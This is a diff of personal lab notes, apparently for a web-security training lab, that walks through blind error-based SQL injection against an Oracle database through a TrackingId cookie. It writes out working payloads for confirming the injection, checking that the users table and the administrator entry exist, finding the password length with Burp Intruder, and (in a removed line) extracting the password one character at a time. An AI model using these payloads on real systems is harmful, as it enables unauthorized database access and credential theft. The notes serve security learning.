@@ -13,7 +13,19 @@ TrackingId=xyz'||(SELECT '')||'   --{500 Internal Server Error
 ' || (select '' from dual) ||'    --{200 OK, due to Oracle database requires from
 
 
+try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:
+TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
+' || (select '' from ddd)||'      --{ 500 Internal Server Error
+This behavior strongly suggests that your injection is being processed as a SQL query by the back-end. 
 
+Checking if table users exists
+' || (select '' from users where rownum = 1)||'      --{ 200 OK
+' || (select '' from userss where rownum = 1)||'     --{ 500 Internal Server Error
+Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break our concatenation.
+
+ You can also exploit this behavior to test conditions. First, submit the following query: 
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'   --{ 500 Internal Server Error
+'||(SELECT CASE WHEN (1=11) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'  --{ 200 OK
 
 
 Getting no error. 200 OK
@@ -22,4 +34,29 @@ Getting no error. 200 OK
 500 internal server error
 ' and (select case when (1=1) then to_char(1/0) else 'a' END from dual)='a
 
-Cookie: TrackingId=ZC9QkGN4YpN2rQTh' and (select case when (username = 'Administrator' and SUBSTR(Password, 1, 1) > 'a') then to_char(1/0) else 'b' END from users)='a
+You can use this behavior to test whether specific entries exist in a table
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator')||'   --{ 500 Internal Server Error
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrators')||'   --{ 200 OK
+
+The next step is to determine how many characters are in the password of the administrator user. 
+To do this, change the value to: 
+'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+Use burp intruder to automate
+'||(SELECT CASE WHEN length(password)>§1§ THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator')||'
+The password length is 20. Got '200 OK' at 19
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
